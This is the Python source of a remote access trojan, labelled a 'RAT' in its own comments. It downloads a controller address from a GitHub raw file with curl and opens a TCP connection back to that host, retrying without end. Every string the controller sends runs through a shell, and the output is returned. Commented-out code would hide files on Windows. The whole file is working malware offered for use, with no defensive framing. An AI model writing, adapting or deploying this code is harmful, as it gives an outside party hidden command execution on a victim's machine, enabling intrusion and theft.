#!/usr/bin/env python3

import socket
import os
import sys
import shlex, subprocess

# setup commands for this RAT

def get_platform():
    platforms = {
        'linux1' : 'linux',
        'linux2' : 'linux', # foolish man-thing
        'darwin' : 'OS X',
        'win32' : 'Windows'
    }
    if sys.platform not in platforms:
        return sys.platform
    
    return platforms[sys.platform]

def get_ip():
    raw_text = subprocess.check_output(['curl -X GET https://raw.githubusercontent.com/lbetterton/remoteip/main/ip.txt'], shell=True).decode('utf-8').strip().replace("\n", "").split(",")
    print(raw_text)
    return raw_text[0], int(raw_text[1])
    

# list_file_cmd = "ls" if get_platform() == "linux" else "dir"
output_contents_cmd = "cat" if get_platform() == "linux" else "more"
output_pwd_cmd = "pwd" if get_platform() == "linux" else "echo %cd%"
path = subprocess.check_output(['whoami'], shell=True).decode('utf-8').strip().replace("\n", "")
# if get_platform() == "Windows":
#     path = path.split("\\")[1]
#     print(path)
# output_homedir_cmd = f"/home/{path}/" if get_platform() == "linux" else f"C:/Users/{path}/"
output_homedir_cmd = f"/home/{path}/" if not path == "root" else "/etc/"

HOST, PORT = get_ip() # HOST: The server's hostname or IP address, PORT The port used by the server

current_tries = 0

while(True):

    if (current_tries > 5):
        
        HOST, PORT = get_ip()
        current_tries = 0

    print("Attempting connection with the vermin control...")

    try:
    
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

            s.settimeout(5) # while we expect it to fail
            s.connect((HOST, PORT))
            s.settimeout(None) # if it succeeds, we want it to remain open

            print("Connected")
            current_tries = 0

            remote_command = None

            while(remote_command != "halt"):

                try:
                    data = s.recv(16384) # this needs to be fixed to allow more bytes
                except ConnectionAbortedError as error:
                    print(error)
                    remote_command = "halt"
                    continue
                
                remote_command = data.decode("utf-8") # should be inside the try except

                print('Received', remote_command)

                command_results = None

                if "/cwd" in remote_command:
                    command = remote_command.split(" ")
                    if len(command) == 2:
                        os.chdir(command[1])
                        command_results = subprocess.run(output_pwd_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding="utf-8").stdout
                    else:
                        print("Wrong format detected")
                else:
                    # print("SHLEX output:", shlex.split(remote_command))
                    # command_results = subprocess.run(shlex.split(remote_command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding="utf-8").stdout
                    command_results = subprocess.run(remote_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding="utf-8").stdout

                # if windows, hide the RAT droppings
                # if get_platform() == "Windows":
                #     os.system(f"attrib +s +h {output_homedir_cmd}dropping.txt")

                # command_results = None

                # if os.system(f"{output_contents_cmd} {output_homedir_cmd}dropping.txt") == 0:
                    
                #     try:
                #         with open(f"{output_homedir_cmd}dropping.txt", "r") as file:
                #             command_results = file.read()
                #     except error:
                #         command_results = error
                #         remote_command = "halt"
                #         continue

                # else:
                #     command_results = "No output found, the command may have failed"

                message = f"Executed command {remote_command} >> Command Results:\n\n{command_results}".encode("utf-8")

                # send the size in bytes of the incoming response 
                length_in_bytes = len(message)
                print(message)

                print(f"Message length in characters {length_in_bytes}")

                m_bytes_length = length_in_bytes.to_bytes(length_in_bytes.bit_length(), 'little', signed=True)   

                try:

                    while (s.sendall(m_bytes_length) != None):
                        continue
                    print(f"\n\nSent message length: {int.from_bytes(m_bytes_length, 'little', signed=True)}")

                    while (s.sendall(message) != None):
                        continue
                    print(f"\n\nSent message: {message}")

                except ConnectionAbortedError as error:
                    print(error)
                    remote_command = "halt"
                    continue
                except BaseException as based:
                    print(based)
                    remote_command = "halt"
                    continue

    except ConnectionRefusedError as conn_error:
        print(conn_error)
        current_tries = current_tries + 1
    except BaseException as based:
        print(f"rat rat 🐀 {based}")
        current_tries = current_tries + 1